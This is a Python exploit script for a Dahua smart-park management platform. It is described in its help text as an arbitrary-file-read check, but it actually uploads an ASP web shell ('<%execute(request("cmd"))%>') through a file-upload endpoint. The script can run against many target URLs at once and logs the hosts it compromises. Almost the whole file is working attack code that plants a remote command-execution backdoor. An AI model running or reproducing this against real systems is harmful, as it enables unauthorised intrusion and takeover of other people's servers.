import sys
import requests
import argparse
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 输出颜色
GREEN = '\033[92m'
RESET = '\033[0m'

# 定义程序的横幅
def banner():
    test = r"""

  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|


                            version:1.1.0
                            author:fangwei   
"""
    print(test)

# 主函数，解析命令行参数并调用相应的功能函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区 任意文件读取漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='File Path')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        # 多线程处理
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

# 检测漏洞函数，向目标URL发送请求，检查是否存在漏洞
def poc(target):
    payload_url = '/SystemManager/Introduction.ashx'
    url = target + payload_url
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/49.0.2656.18 Safari/537.36',
        'Connection': 'close',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Content-Type': 'multipart/form-data; boundary=--------------------------354575237365372692397370',
        'Accept-Encoding': 'gzip',
    }

    data = (
        '----------------------------354575237365372692397370\r\n'
        'Content-Disposition: form-data; name="file"; filename="5.txt"\r\n'
        'Content-Type: image/jpeg\r\n\r\n'
        '<%execute(request("cmd"))%>\r\n'
        '----------------------------354575237365372692397370\r\n'
        'Content-Disposition: form-data; name="fileName"\r\n\r\n'
        'test_20240504.asp\r\n'
        '----------------------------354575237365372692397370\r\n'
        'Content-Disposition: form-data; name="Method"\r\n'
        '\r\n'
        'UpdateUploadLinkPic\r\n'
        '----------------------------354575237365372692397370--\r\n'
    )

    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }

    try:
        res = requests.post(url=url, headers=headers, data=data, verify=False, timeout=8)

        if res.status_code == 200 and 'asp' in res.text:
            print(f"{GREEN}[+]该网站存在文件上传漏洞，url为 {target}{RESET}")
            with open("zcre.txt", "a", encoding="utf-8") as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]该网站不存在文件上传漏洞，url为 {target}")

    except Exception as e:
        print(f"[*]该网站存在问题, url为: {target}, 错误信息: {e}")

# 程序入口点
if __name__ == '__main__':
    main()
